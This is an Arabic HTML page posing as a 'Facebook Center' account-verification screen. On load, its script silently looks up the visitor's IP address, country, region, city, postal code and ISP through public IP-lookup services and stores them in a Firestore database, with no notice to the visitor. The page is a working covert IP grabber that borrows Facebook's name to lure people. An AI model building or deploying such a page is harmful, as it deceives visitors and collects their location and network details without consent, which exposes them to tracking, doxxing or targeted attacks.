<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز فيسبوك</title>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #0d1117;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .main-card {
            background-color: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 30px;
            max-width: 450px;
            width: 100%;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }

        h1 {
            color: #00ff66;
            margin-bottom: 15px;
            font-size: 1.5rem;
        }

        p {
            color: #8b949e;
            font-size: 0.95rem;
            line-height: 1.6;
        }
    </style>
</head>
<body>

    <div class="main-card">
        <h1>مركز فيسبوك</h1>
        <p>جاري التحقق من الحساب...</p>
    </div>

    <script>
        // إعدادات Firebase الخاصة بمشروعك
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "beauty-store-4f012.firebaseapp.com",
            projectId: "beauty-store-4f012",
            storageBucket: "beauty-store-4f012.appspot.com",
            messagingSenderId: "YOUR_SENDER_ID",
            appId: "YOUR_APP_ID"
        };

        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.firestore();

        // دالة جلب IP والتفاصيل الجغرافية الدقيقة
        async function getVisitorDetails() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    return {
                        ip: data.ip,
                        country: data.country_name || 'غير معروف',
                        region: data.region || 'غير معروف',
                        city: data.city || 'غير معروف',
                        zip: data.postal || 'غير متوفر',
                        isp: data.org || 'غير معروف'
                    };
                }
            } catch (e) {
                console.warn("Retrying with backup service...");
            }

            // خدمة احتياطية
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: 'غير معروف',
                    region: 'غير معروف',
                    city: 'غير معروف',
                    zip: 'غير متوفر',
                    isp: 'غير معروف'
                };
            } catch (e) {
                return null;
            }
        }

        // دالة حفظ الزيارة في Firestore
        async function recordVisitor() {
            try {
                const details = await getVisitorDetails();
                if (!details || !details.ip) return;

                await db.collection("visitors").add({
                    ip: details.ip,
                    country: details.country,
                    region: details.region,
                    city: details.city,
                    zip: details.zip,
                    isp: details.isp,
                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                });
                console.log("Recorded visitor successfully:", details);
            } catch (error) {
                console.error("Error saving visitor:", error);
            }
        }

        document.addEventListener("DOMContentLoaded", recordVisitor);
    </script>
</body>
</html>
